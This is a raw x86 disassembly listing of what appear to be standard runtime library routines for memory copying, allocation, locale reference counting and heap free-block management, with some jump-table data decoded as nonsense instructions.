  4260f4:	add    BYTE PTR [ecx+0x42],ah
  4260f7:	add    BYTE PTR [ecx+eiz*2],ch
  4260fa:	inc    edx
  4260fb:	add    BYTE PTR [eax+0x61],dl
  4260fe:	inc    edx
  4260ff:	add    BYTE PTR [ebx],ah
  426101:	ror    DWORD PTR [edx-0x75f877fa],1
  426107:	inc    esi
  426108:	add    DWORD PTR [eax+0x468a0147],ecx
  42610e:	add    al,cl
  426110:	jmp    0x289e917
  426115:	add    esi,0x3
  426118:	add    edi,0x3
  42611b:	cmp    ecx,0x8
  42611e:	jb     0x4260ec
  426120:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426122:	jmp    DWORD PTR [edx*4+0x4261dc]
  426129:	lea    ecx,[ecx+0x0]
  42612c:	and    edx,ecx
  42612e:	mov    al,BYTE PTR [esi]
  426130:	mov    BYTE PTR [edi],al
  426132:	mov    al,BYTE PTR [esi+0x1]
  426135:	shr    ecx,0x2
  426138:	mov    BYTE PTR [edi+0x1],al
  42613b:	add    esi,0x2
  42613e:	add    edi,0x2
  426141:	cmp    ecx,0x8
  426144:	jb     0x4260ec
  426146:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426148:	jmp    DWORD PTR [edx*4+0x4261dc]
  42614f:	nop
  426150:	and    edx,ecx
  426152:	mov    al,BYTE PTR [esi]
  426154:	mov    BYTE PTR [edi],al
  426156:	add    esi,0x1
  426159:	shr    ecx,0x2
  42615c:	add    edi,0x1
  42615f:	cmp    ecx,0x8
  426162:	jb     0x4260ec
  426164:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426166:	jmp    DWORD PTR [edx*4+0x4261dc]
  42616d:	lea    ecx,[ecx+0x0]
  426170:	shl    DWORD PTR [ecx+0x42],cl
  426173:	add    al,al
  426175:	popa   
  426176:	inc    edx
  426177:	add    BYTE PTR [eax-0x4fffbd9f],bh
  42617d:	popa   
  42617e:	inc    edx
  42617f:	add    BYTE PTR [eax-0x5fffbd9f],ch
  426185:	popa   
  426186:	inc    edx
  426187:	add    BYTE PTR [eax-0x6fffbd9f],bl
  42618d:	popa   
  42618e:	inc    edx
  42618f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426195:	inc    esp
  426196:	(bad)  
  426197:	in     al,0x8b
  426199:	inc    esp
  42619a:	mov    gs,eax
  42619c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261c8:	lea    eax,[ecx*4+0x0]
  4261cf:	add    esi,eax
  4261d1:	add    edi,eax
  4261d3:	jmp    DWORD PTR [edx*4+0x4261dc]
  4261da:	mov    edi,edi
  4261dc:	in     al,dx
  4261dd:	popa   
  4261de:	inc    edx
  4261df:	add    ah,dh
  4261e1:	popa   
  4261e2:	inc    edx
  4261e3:	add    BYTE PTR [eax],al
  4261e5:	bound  eax,QWORD PTR [edx+0x0]
  4261e8:	adc    al,0x62
  4261ea:	inc    edx
  4261eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261f1:	leave  
  4261f2:	ret    
  4261f3:	nop
  4261f4:	mov    al,BYTE PTR [esi]
  4261f6:	mov    BYTE PTR [edi],al
  4261f8:	mov    eax,DWORD PTR [ebp+0x8]
  4261fb:	pop    esi
  4261fc:	pop    edi
  4261fd:	leave  
  4261fe:	ret    
  4261ff:	nop
  426200:	mov    al,BYTE PTR [esi]
  426202:	mov    BYTE PTR [edi],al
  426204:	mov    al,BYTE PTR [esi+0x1]
  426207:	mov    BYTE PTR [edi+0x1],al
  42620a:	mov    eax,DWORD PTR [ebp+0x8]
  42620d:	pop    esi
  42620e:	pop    edi
  42620f:	leave  
  426210:	ret    
  426211:	lea    ecx,[ecx+0x0]
  426214:	mov    al,BYTE PTR [esi]
  426216:	mov    BYTE PTR [edi],al
  426218:	mov    al,BYTE PTR [esi+0x1]
  42621b:	mov    BYTE PTR [edi+0x1],al
  42621e:	mov    al,BYTE PTR [esi+0x2]
  426221:	mov    BYTE PTR [edi+0x2],al
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	pop    esi
  426228:	pop    edi
  426229:	leave  
  42622a:	ret    
  42622b:	nop
  42622c:	lea    esi,[ecx+esi*1-0x4]
  426230:	lea    edi,[ecx+edi*1-0x4]
  426234:	test   edi,0x3
  42623a:	jne    0x426260
  42623c:	shr    ecx,0x2
  42623f:	and    edx,0x3
  426242:	cmp    ecx,0x8
  426245:	jb     0x426254
  426247:	std    
  426248:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624a:	cld    
  42624b:	jmp    DWORD PTR [edx*4+0x426378]
  426252:	mov    edi,edi
  426254:	neg    ecx
  426256:	jmp    DWORD PTR [ecx*4+0x426328]
  42625d:	lea    ecx,[ecx+0x0]
  426260:	mov    eax,edi
  426262:	mov    edx,0x3
  426267:	cmp    ecx,0x4
  42626a:	jb     0x426278
  42626c:	and    eax,0x3
  42626f:	sub    ecx,eax
  426271:	jmp    DWORD PTR [eax*4+0x42627c]
  426278:	jmp    DWORD PTR [ecx*4+0x426378]
  42627f:	nop
  426280:	mov    WORD PTR [edx+0x42],fs
  426283:	add    BYTE PTR [eax-0x27ffbd9e],dh
  426289:	bound  eax,QWORD PTR [edx+0x0]
  42628c:	mov    al,BYTE PTR [esi+0x3]
  42628f:	and    edx,ecx
  426291:	mov    BYTE PTR [edi+0x3],al
  426294:	sub    esi,0x1
  426297:	shr    ecx,0x2
  42629a:	sub    edi,0x1
  42629d:	cmp    ecx,0x8
  4262a0:	jb     0x426254
  4262a2:	std    
  4262a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	cld    
  4262a6:	jmp    DWORD PTR [edx*4+0x426378]
  4262ad:	lea    ecx,[ecx+0x0]
  4262b0:	mov    al,BYTE PTR [esi+0x3]
  4262b3:	and    edx,ecx
  4262b5:	mov    BYTE PTR [edi+0x3],al
  4262b8:	mov    al,BYTE PTR [esi+0x2]
  4262bb:	shr    ecx,0x2
  4262be:	mov    BYTE PTR [edi+0x2],al
  4262c1:	sub    esi,0x2
  4262c4:	sub    edi,0x2
  4262c7:	cmp    ecx,0x8
  4262ca:	jb     0x426254
  4262cc:	std    
  4262cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262cf:	cld    
  4262d0:	jmp    DWORD PTR [edx*4+0x426378]
  4262d7:	nop
  4262d8:	mov    al,BYTE PTR [esi+0x3]
  4262db:	and    edx,ecx
  4262dd:	mov    BYTE PTR [edi+0x3],al
  4262e0:	mov    al,BYTE PTR [esi+0x2]
  4262e3:	mov    BYTE PTR [edi+0x2],al
  4262e6:	mov    al,BYTE PTR [esi+0x1]
  4262e9:	shr    ecx,0x2
  4262ec:	mov    BYTE PTR [edi+0x1],al
  4262ef:	sub    esi,0x3
  4262f2:	sub    edi,0x3
  4262f5:	cmp    ecx,0x8
  4262f8:	jb     0x426254
  4262fe:	std    
  4262ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426301:	cld    
  426302:	jmp    DWORD PTR [edx*4+0x426378]
  426309:	lea    ecx,[ecx+0x0]
  42630c:	sub    al,0x63
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2],dh
  426312:	inc    edx
  426313:	add    BYTE PTR [ebx+eiz*2],bh
  426316:	inc    edx
  426317:	add    BYTE PTR [ebx+eiz*2+0x42],al
  42631b:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  42631f:	add    BYTE PTR [ebx+eiz*2+0x42],dl
  426323:	add    BYTE PTR [ebx+eiz*2+0x42],bl
  426327:	add    BYTE PTR [edi+0x63],ch
  42632a:	inc    edx
  42632b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426331:	inc    esp
  426332:	(bad)  
  426333:	sbb    al,0x8b
  426335:	inc    esp
  426336:	mov    ds,WORD PTR [eax]
  426338:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426340:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426348:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426350:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426354:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426358:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42635c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426360:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426364:	lea    eax,[ecx*4+0x0]
  42636b:	add    esi,eax
  42636d:	add    edi,eax
  42636f:	jmp    DWORD PTR [edx*4+0x426378]
  426376:	mov    edi,edi
  426378:	mov    BYTE PTR [ebx+0x42],ah
  42637b:	add    BYTE PTR [eax-0x5fffbd9d],dl
  426381:	arpl   WORD PTR [edx+0x0],ax
  426384:	mov    ah,0x63
  426386:	inc    edx
  426387:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42638d:	leave  
  42638e:	ret    
  42638f:	nop
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    eax,DWORD PTR [ebp+0x8]
  426399:	pop    esi
  42639a:	pop    edi
  42639b:	leave  
  42639c:	ret    
  42639d:	lea    ecx,[ecx+0x0]
  4263a0:	mov    al,BYTE PTR [esi+0x3]
  4263a3:	mov    BYTE PTR [edi+0x3],al
  4263a6:	mov    al,BYTE PTR [esi+0x2]
  4263a9:	mov    BYTE PTR [edi+0x2],al
  4263ac:	mov    eax,DWORD PTR [ebp+0x8]
  4263af:	pop    esi
  4263b0:	pop    edi
  4263b1:	leave  
  4263b2:	ret    
  4263b3:	nop
  4263b4:	mov    al,BYTE PTR [esi+0x3]
  4263b7:	mov    BYTE PTR [edi+0x3],al
  4263ba:	mov    al,BYTE PTR [esi+0x2]
  4263bd:	mov    BYTE PTR [edi+0x2],al
  4263c0:	mov    al,BYTE PTR [esi+0x1]
  4263c3:	mov    BYTE PTR [edi+0x1],al
  4263c6:	mov    eax,DWORD PTR [ebp+0x8]
  4263c9:	pop    esi
  4263ca:	pop    edi
  4263cb:	leave  
  4263cc:	ret    
  4263cd:	push   DWORD PTR [esp+0x4]
  4263d1:	call   DWORD PTR ds:0x4290cc
  4263d7:	xor    eax,eax
  4263d9:	inc    eax
  4263da:	ret    0x8
  4263dd:	push   0x10
  4263df:	push   0x4296d0
  4263e4:	call   0x425350
  4263e9:	mov    eax,ds:0x45dd88
  4263ee:	test   eax,eax
  4263f0:	jne    0x426429
  4263f2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263f9:	je     0x42641f
  4263fb:	push   0x4296bc
  426400:	call   DWORD PTR ds:0x429024
  426406:	test   eax,eax
  426408:	je     0x42641f
  42640a:	push   0x429694
  42640f:	push   eax
  426410:	call   DWORD PTR ds:0x429020
  426416:	mov    ds:0x45dd88,eax
  42641b:	test   eax,eax
  42641d:	jne    0x426429
  42641f:	mov    eax,0x4263cd
  426424:	mov    ds:0x45dd88,eax
  426429:	and    DWORD PTR [ebp-0x4],0x0
  42642d:	push   DWORD PTR [ebp+0xc]
  426430:	push   DWORD PTR [ebp+0x8]
  426433:	call   eax
  426435:	mov    DWORD PTR [ebp-0x1c],eax
  426438:	jmp    0x42645e
  42643a:	mov    eax,DWORD PTR [ebp-0x14]
  42643d:	mov    eax,DWORD PTR [eax]
  42643f:	mov    eax,DWORD PTR [eax]
  426441:	mov    DWORD PTR [ebp-0x20],eax
  426444:	xor    eax,eax
  426446:	inc    eax
  426447:	ret    
  426448:	mov    esp,DWORD PTR [ebp-0x18]
  42644b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426452:	jne    0x42645c
  426454:	push   0x8
  426456:	call   DWORD PTR ds:0x429098
  42645c:	xor    eax,eax
  42645e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426462:	call   0x42538b
  426467:	ret    
  426468:	push   0x10
  42646a:	push   0x4296e0
  42646f:	call   0x425350
  426474:	mov    esi,DWORD PTR [ebp+0x8]
  426477:	imul   esi,DWORD PTR [ebp+0xc]
  42647b:	mov    DWORD PTR [ebp-0x1c],esi
  42647e:	test   esi,esi
  426480:	jne    0x426483
  426482:	inc    esi
  426483:	xor    edi,edi
  426485:	mov    DWORD PTR [ebp-0x20],edi
  426488:	cmp    esi,0xffffffe0
  42648b:	ja     0x4264f2
  42648d:	cmp    DWORD PTR ds:0x45e144,0x3
  426494:	jne    0x4264dd
  426496:	add    esi,0xf
  426499:	and    esi,0xfffffff0
  42649c:	mov    DWORD PTR [ebp+0xc],esi
  42649f:	mov    ebx,DWORD PTR [ebp-0x1c]
  4264a2:	cmp    ebx,DWORD PTR ds:0x45df04
  4264a8:	ja     0x4264dd
  4264aa:	push   0x4
  4264ac:	call   0x42550f
  4264b1:	pop    ecx
  4264b2:	and    DWORD PTR [ebp-0x4],edi
  4264b5:	push   ebx
  4264b6:	call   0x426f11
  4264bb:	pop    ecx
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264c3:	call   0x426512
  4264c8:	mov    edi,DWORD PTR [ebp-0x20]
  4264cb:	test   edi,edi
  4264cd:	je     0x4264e1
  4264cf:	push   DWORD PTR [ebp-0x1c]
  4264d2:	push   0x0
  4264d4:	push   edi
  4264d5:	call   0x427c50
  4264da:	add    esp,0xc
  4264dd:	test   edi,edi
  4264df:	jne    0x42651b
  4264e1:	push   esi
  4264e2:	push   0x8
  4264e4:	push   DWORD PTR ds:0x45e140
  4264ea:	call   DWORD PTR ds:0x429030
  4264f0:	mov    edi,eax
  4264f2:	test   edi,edi
  4264f4:	jne    0x42651b
  4264f6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264fc:	je     0x42651b
  4264fe:	push   esi
  4264ff:	call   0x427c32
  426504:	pop    ecx
  426505:	test   eax,eax
  426507:	jne    0x426483
  42650d:	jmp    0x42651d
  42650f:	mov    esi,DWORD PTR [ebp+0xc]
  426512:	push   0x4
  426514:	call   0x42547b
  426519:	pop    ecx
  42651a:	ret    
  42651b:	mov    eax,edi
  42651d:	call   0x42538b
  426522:	ret    
  426523:	push   esi
  426524:	mov    esi,DWORD PTR [esp+0x8]
  426528:	mov    eax,DWORD PTR [esi+0x3c]
  42652b:	push   edi
  42652c:	xor    edi,edi
  42652e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426534:	je     0x426599
  426536:	cmp    eax,edi
  426538:	je     0x426599
  42653a:	mov    eax,DWORD PTR [esi+0x2c]
  42653d:	cmp    DWORD PTR [eax],edi
  42653f:	jne    0x426599
  426541:	mov    eax,DWORD PTR [esi+0x34]
  426544:	cmp    eax,edi
  426546:	je     0x426564
  426548:	cmp    DWORD PTR [eax],edi
  42654a:	jne    0x426564
  42654c:	cmp    eax,DWORD PTR ds:0x45def0
  426552:	je     0x426564
  426554:	push   eax
  426555:	call   0x425f5a
  42655a:	push   DWORD PTR [esi+0x3c]
  42655d:	call   0x427e9f
  426562:	pop    ecx
  426563:	pop    ecx
  426564:	mov    eax,DWORD PTR [esi+0x30]
  426567:	cmp    eax,edi
  426569:	je     0x426587
  42656b:	cmp    DWORD PTR [eax],edi
  42656d:	jne    0x426587
  42656f:	cmp    eax,DWORD PTR ds:0x45def4
  426575:	je     0x426587
  426577:	push   eax
  426578:	call   0x425f5a
  42657d:	push   DWORD PTR [esi+0x3c]
  426580:	call   0x427e40
  426585:	pop    ecx
  426586:	pop    ecx
  426587:	push   DWORD PTR [esi+0x2c]
  42658a:	call   0x425f5a
  42658f:	push   DWORD PTR [esi+0x3c]
  426592:	call   0x425f5a
  426597:	pop    ecx
  426598:	pop    ecx
  426599:	mov    eax,DWORD PTR [esi+0x40]
  42659c:	cmp    eax,DWORD PTR ds:0x45deec
  4265a2:	je     0x4265bc
  4265a4:	cmp    eax,edi
  4265a6:	je     0x4265bc
  4265a8:	cmp    DWORD PTR [eax],edi
  4265aa:	jne    0x4265bc
  4265ac:	push   eax
  4265ad:	call   0x425f5a
  4265b2:	push   DWORD PTR [esi+0x44]
  4265b5:	call   0x425f5a
  4265ba:	pop    ecx
  4265bb:	pop    ecx
  4265bc:	mov    eax,DWORD PTR [esi+0x50]
  4265bf:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265c5:	je     0x4265e3
  4265c7:	cmp    eax,edi
  4265c9:	je     0x4265e3
  4265cb:	cmp    DWORD PTR [eax+0xb4],edi
  4265d1:	jne    0x4265e3
  4265d3:	push   eax
  4265d4:	call   0x427cb0
  4265d9:	push   DWORD PTR [esi+0x50]
  4265dc:	call   0x425f5a
  4265e1:	pop    ecx
  4265e2:	pop    ecx
  4265e3:	push   esi
  4265e4:	call   0x425f5a
  4265e9:	pop    ecx
  4265ea:	pop    edi
  4265eb:	pop    esi
  4265ec:	ret    
  4265ed:	push   esi
  4265ee:	call   0x425203
  4265f3:	mov    esi,eax
  4265f5:	mov    eax,DWORD PTR [esi+0x64]
  4265f8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265fe:	je     0x4266aa
  426604:	test   eax,eax
  426606:	je     0x426637
  426608:	mov    ecx,DWORD PTR [eax+0x2c]
  42660b:	dec    DWORD PTR [eax]
  42660d:	test   ecx,ecx
  42660f:	je     0x426613
  426611:	dec    DWORD PTR [ecx]
  426613:	mov    ecx,DWORD PTR [eax+0x34]
  426616:	test   ecx,ecx
  426618:	je     0x42661c
  42661a:	dec    DWORD PTR [ecx]
  42661c:	mov    ecx,DWORD PTR [eax+0x30]
  42661f:	test   ecx,ecx
  426621:	je     0x426625
  426623:	dec    DWORD PTR [ecx]
  426625:	mov    ecx,DWORD PTR [eax+0x40]
  426628:	test   ecx,ecx
  42662a:	je     0x42662e
  42662c:	dec    DWORD PTR [ecx]
  42662e:	mov    ecx,DWORD PTR [eax+0x4c]
  426631:	dec    DWORD PTR [ecx+0xb4]
  426637:	mov    ecx,DWORD PTR ds:0x45d58c
  42663d:	mov    DWORD PTR [esi+0x64],ecx
  426640:	mov    ecx,DWORD PTR ds:0x45d58c
  426646:	inc    DWORD PTR [ecx]
  426648:	mov    ecx,DWORD PTR ds:0x45d58c
  42664e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426651:	test   ecx,ecx
  426653:	je     0x426657
  426655:	inc    DWORD PTR [ecx]
  426657:	mov    ecx,DWORD PTR ds:0x45d58c
  42665d:	mov    ecx,DWORD PTR [ecx+0x34]
  426660:	test   ecx,ecx
  426662:	je     0x426666
  426664:	inc    DWORD PTR [ecx]
  426666:	mov    ecx,DWORD PTR ds:0x45d58c
  42666c:	mov    ecx,DWORD PTR [ecx+0x30]
  42666f:	test   ecx,ecx
  426671:	je     0x426675
  426673:	inc    DWORD PTR [ecx]
  426675:	mov    ecx,DWORD PTR ds:0x45d58c
  42667b:	mov    ecx,DWORD PTR [ecx+0x40]
  42667e:	test   ecx,ecx
  426680:	je     0x426684
  426682:	inc    DWORD PTR [ecx]
  426684:	mov    ecx,DWORD PTR ds:0x45d58c
  42668a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42668d:	inc    DWORD PTR [ecx+0xb4]
  426693:	test   eax,eax
  426695:	je     0x4266aa
  426697:	cmp    DWORD PTR [eax],0x0
  42669a:	jne    0x4266aa
  42669c:	cmp    eax,0x45d538
  4266a1:	je     0x4266aa
  4266a3:	push   eax
  4266a4:	call   0x426523
  4266a9:	pop    ecx
  4266aa:	mov    eax,DWORD PTR [esi+0x64]
  4266ad:	pop    esi
  4266ae:	ret    
  4266af:	push   0xc
  4266b1:	push   0x429870
  4266b6:	call   0x425350
  4266bb:	push   0xc
  4266bd:	call   0x42550f
  4266c2:	pop    ecx
  4266c3:	and    DWORD PTR [ebp-0x4],0x0
  4266c7:	call   0x4265ed
  4266cc:	mov    DWORD PTR [ebp-0x1c],eax
  4266cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266d3:	call   0x4266e1
  4266d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266db:	call   0x42538b
  4266e0:	ret    
  4266e1:	push   0xc
  4266e3:	call   0x42547b
  4266e8:	pop    ecx
  4266e9:	ret    
  4266ea:	push   0x140
  4266ef:	push   0x0
  4266f1:	push   DWORD PTR ds:0x45e140
  4266f7:	call   DWORD PTR ds:0x429030
  4266fd:	test   eax,eax
  4266ff:	mov    ds:0x45df00,eax
  426704:	jne    0x426707
  426706:	ret    
  426707:	mov    ecx,DWORD PTR [esp+0x4]
  42670b:	and    DWORD PTR ds:0x45def8,0x0
  426712:	and    DWORD PTR ds:0x45defc,0x0
  426719:	mov    ds:0x45df08,eax
  42671e:	xor    eax,eax
  426720:	mov    DWORD PTR ds:0x45df04,ecx
  426726:	mov    DWORD PTR ds:0x45df0c,0x10
  426730:	inc    eax
  426731:	ret    
  426732:	mov    eax,ds:0x45defc
  426737:	lea    ecx,[eax+eax*4]
  42673a:	mov    eax,ds:0x45df00
  42673f:	lea    ecx,[eax+ecx*4]
  426742:	jmp    0x426756
  426744:	mov    edx,DWORD PTR [esp+0x4]
  426748:	sub    edx,DWORD PTR [eax+0xc]
  42674b:	cmp    edx,0x100000
  426751:	jb     0x42675c
  426753:	add    eax,0x14
  426756:	cmp    eax,ecx
  426758:	jb     0x426744
  42675a:	xor    eax,eax
  42675c:	ret    
  42675d:	push   ebp
  42675e:	mov    ebp,esp
  426760:	sub    esp,0x10
  426763:	mov    ecx,DWORD PTR [ebp+0x8]
  426766:	mov    eax,DWORD PTR [ecx+0x10]
  426769:	push   esi
  42676a:	mov    esi,DWORD PTR [ebp+0xc]
  42676d:	push   edi
  42676e:	mov    edi,esi
  426770:	sub    edi,DWORD PTR [ecx+0xc]
  426773:	add    esi,0xfffffffc
  426776:	shr    edi,0xf
  426779:	mov    ecx,edi
  42677b:	imul   ecx,ecx,0x204
  426781:	lea    ecx,[ecx+eax*1+0x144]
  426788:	mov    DWORD PTR [ebp-0x10],ecx
  42678b:	mov    ecx,DWORD PTR [esi]
  42678d:	dec    ecx
  42678e:	test   cl,0x1
  426791:	mov    DWORD PTR [ebp-0x4],ecx
  426794:	jne    0x426a71
  42679a:	push   ebx
  42679b:	lea    ebx,[ecx+esi*1]
  42679e:	mov    edx,DWORD PTR [ebx]
  4267a0:	mov    DWORD PTR [ebp-0xc],edx
  4267a3:	mov    edx,DWORD PTR [esi-0x4]
  4267a6:	mov    DWORD PTR [ebp-0x8],edx
  4267a9:	mov    edx,DWORD PTR [ebp-0xc]
  4267ac:	test   dl,0x1
  4267af:	mov    DWORD PTR [ebp+0xc],ebx
  4267b2:	jne    0x426828
  4267b4:	sar    edx,0x4
  4267b7:	dec    edx
  4267b8:	cmp    edx,0x3f
  4267bb:	jbe    0x4267c0
  4267bd:	push   0x3f
  4267bf:	pop    edx
  4267c0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267c3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267c6:	jne    0x42680a
  4267c8:	cmp    edx,0x20
  4267cb:	mov    ebx,0x80000000
  4267d0:	jae    0x4267eb
  4267d2:	mov    ecx,edx
  4267d4:	shr    ebx,cl
  4267d6:	lea    ecx,[edx+eax*1+0x4]
  4267da:	not    ebx
  4267dc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267e0:	dec    BYTE PTR [ecx]
  4267e2:	jne    0x426807
  4267e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e7:	and    DWORD PTR [ecx],ebx
  4267e9:	jmp    0x426807
  4267eb:	lea    ecx,[edx-0x20]
  4267ee:	shr    ebx,cl
  4267f0:	lea    ecx,[edx+eax*1+0x4]
  4267f4:	not    ebx
  4267f6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267fd:	dec    BYTE PTR [ecx]
  4267ff:	jne    0x426807
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	and    DWORD PTR [ecx+0x4],ebx
  426807:	mov    ebx,DWORD PTR [ebp+0xc]
  42680a:	mov    edx,DWORD PTR [ebx+0x8]
  42680d:	mov    ebx,DWORD PTR [ebx+0x4]
  426810:	mov    ecx,DWORD PTR [ebp-0x4]
  426813:	add    ecx,DWORD PTR [ebp-0xc]
  426816:	mov    DWORD PTR [edx+0x4],ebx
  426819:	mov    edx,DWORD PTR [ebp+0xc]
  42681c:	mov    ebx,DWORD PTR [edx+0x4]
  42681f:	mov    edx,DWORD PTR [edx+0x8]
  426822:	mov    DWORD PTR [ebx+0x8],edx
  426825:	mov    DWORD PTR [ebp-0x4],ecx
  426828:	mov    edx,ecx
  42682a:	sar    edx,0x4
  42682d:	dec    edx
  42682e:	cmp    edx,0x3f
  426831:	jbe    0x426836
  426833:	push   0x3f
  426835:	pop    edx
  426836:	mov    ebx,DWORD PTR [ebp-0x8]
  426839:	and    ebx,0x1
  42683c:	mov    DWORD PTR [ebp-0xc],ebx
  42683f:	jne    0x4268d4
  426845:	sub    esi,DWORD PTR [ebp-0x8]
  426848:	mov    ebx,DWORD PTR [ebp-0x8]
  42684b:	sar    ebx,0x4
  42684e:	push   0x3f
  426850:	mov    DWORD PTR [ebp+0xc],esi
  426853:	dec    ebx
  426854:	pop    esi
  426855:	cmp    ebx,esi
  426857:	jbe    0x42685b
  426859:	mov    ebx,esi
  42685b:	add    ecx,DWORD PTR [ebp-0x8]
  42685e:	mov    edx,ecx
  426860:	sar    edx,0x4
  426863:	dec    edx
  426864:	cmp    edx,esi
  426866:	mov    DWORD PTR [ebp-0x4],ecx
  426869:	jbe    0x42686d
  42686b:	mov    edx,esi
  42686d:	cmp    ebx,edx
  42686f:	je     0x4268cf
  426871:	mov    ecx,DWORD PTR [ebp+0xc]
  426874:	mov    esi,DWORD PTR [ecx+0x4]
  426877:	cmp    esi,DWORD PTR [ecx+0x8]
  42687a:	jne    0x4268b7
  42687c:	cmp    ebx,0x20
  42687f:	mov    esi,0x80000000
  426884:	jae    0x42689d
  426886:	mov    ecx,ebx
  426888:	shr    esi,cl
  42688a:	not    esi
  42688c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426890:	dec    BYTE PTR [ebx+eax*1+0x4]
  426894:	jne    0x4268b7
  426896:	mov    ecx,DWORD PTR [ebp+0x8]
  426899:	and    DWORD PTR [ecx],esi
  42689b:	jmp    0x4268b7
  42689d:	lea    ecx,[ebx-0x20]
  4268a0:	shr    esi,cl
  4268a2:	not    esi
  4268a4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4268ab:	dec    BYTE PTR [ebx+eax*1+0x4]
  4268af:	jne    0x4268b7
  4268b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268b4:	and    DWORD PTR [ecx+0x4],esi
  4268b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268ba:	mov    esi,DWORD PTR [ecx+0x8]
  4268bd:	mov    ecx,DWORD PTR [ecx+0x4]
  4268c0:	mov    DWORD PTR [esi+0x4],ecx
  4268c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c6:	mov    esi,DWORD PTR [ecx+0x4]
  4268c9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268cc:	mov    DWORD PTR [esi+0x8],ecx
  4268cf:	mov    esi,DWORD PTR [ebp+0xc]
  4268d2:	jmp    0x4268d7
  4268d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268d7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268db:	jne    0x4268e5
  4268dd:	cmp    ebx,edx
  4268df:	je     0x426965
  4268e5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268e8:	lea    ecx,[ecx+edx*8]
  4268eb:	mov    ebx,DWORD PTR [ecx+0x4]
  4268ee:	mov    DWORD PTR [esi+0x8],ecx
  4268f1:	mov    DWORD PTR [esi+0x4],ebx
  4268f4:	mov    DWORD PTR [ecx+0x4],esi
  4268f7:	mov    ecx,DWORD PTR [esi+0x4]
  4268fa:	mov    DWORD PTR [ecx+0x8],esi
  4268fd:	mov    ecx,DWORD PTR [esi+0x4]
  426900:	cmp    ecx,DWORD PTR [esi+0x8]
  426903:	jne    0x426965
  426905:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426909:	mov    BYTE PTR [ebp+0xf],cl
  42690c:	inc    cl
  42690e:	cmp    edx,0x20
  426911:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426915:	jae    0x42693c
  426917:	cmp    BYTE PTR [ebp+0xf],0x0
  42691b:	jne    0x42692b
  42691d:	mov    ecx,edx
  42691f:	mov    ebx,0x80000000
  426924:	shr    ebx,cl
  426926:	mov    ecx,DWORD PTR [ebp+0x8]
  426929:	or     DWORD PTR [ecx],ebx
  42692b:	mov    ebx,0x80000000
  426930:	mov    ecx,edx
  426932:	shr    ebx,cl
  426934:	lea    eax,[eax+edi*4+0x44]
  426938:	or     DWORD PTR [eax],ebx
  42693a:	jmp    0x426965
  42693c:	cmp    BYTE PTR [ebp+0xf],0x0
  426940:	jne    0x426952
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    ebx,0x80000000
